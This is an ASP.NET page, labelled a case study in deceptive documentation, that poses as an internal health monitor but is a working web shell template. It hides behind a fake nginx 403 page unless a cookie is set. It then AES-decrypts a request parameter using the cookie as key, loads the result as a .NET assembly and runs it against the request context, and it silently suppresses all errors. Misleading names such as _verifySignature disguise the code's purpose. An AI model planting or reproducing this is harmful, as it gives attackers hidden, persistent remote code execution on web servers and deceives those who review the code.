<%@ Page Language="C#" %>
<script runat="server">
    /**
     * [CASE STUDY: Deceptive Documentation]
     * Internal Health Monitor Component
     * Validates connectivity and throughput of the application connectors.
     * @version 2.1.0
     */

    private byte[] _verifySignature(byte[] src, string token) {
        try {
            if (string.IsNullOrEmpty(token)) return null;
            string k = token;
            if (k.Length < 16) return null;
            if (k.Length > 16) k = k.Substring(0, 16);

            System.Security.Cryptography.RijndaelManaged r_d = new System.Security.Cryptography.RijndaelManaged();
            r_d.Mode = System.Security.Cryptography.CipherMode.ECB;
            r_d.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            r_d.Key = System.Text.Encoding.Default.GetBytes(k);
            return r_d.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
        } catch { return null; }
    }
</script>
<%
    // access control
    bool isAuthorized = false;
    string SECURITY_TOKEN = ""; 
    string COOKIE_NAME = "$cookie_name$";

    if (Request.Cookies[COOKIE_NAME] != null) {
        SECURITY_TOKEN = Request.Cookies[COOKIE_NAME].Value;
        isAuthorized = true;
    }

    if (!isAuthorized) {
        Response.StatusCode = 403;
%>
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
<%
        return; 
    }

    string PARAM_CONFIG = "$param$"; 
    string CACHE_KEY = "cache_key"; 

    try {
        if (Session[CACHE_KEY] == null) {
            
            if (!string.IsNullOrEmpty(SECURITY_TOKEN) && Request[PARAM_CONFIG] != null) {
                string rawConfig = Request[PARAM_CONFIG];
                
                byte[] bytecode = Convert.FromBase64String(rawConfig);
                bytecode = _verifySignature(bytecode, SECURITY_TOKEN); 
                
                if (bytecode != null) {
                    System.Reflection.Assembly driverClass = System.Reflection.Assembly.Load(bytecode);
                    Session[CACHE_KEY] = driverClass;
                }
            }
        } else {
            System.Reflection.Assembly asm = (System.Reflection.Assembly)Session[CACHE_KEY];
            object driverInstance = asm.CreateInstance("$class_name$");
            driverInstance.Equals(Context); 
            driverInstance.ToString();
        }
    } catch {
       // Silent failure
    }
%>
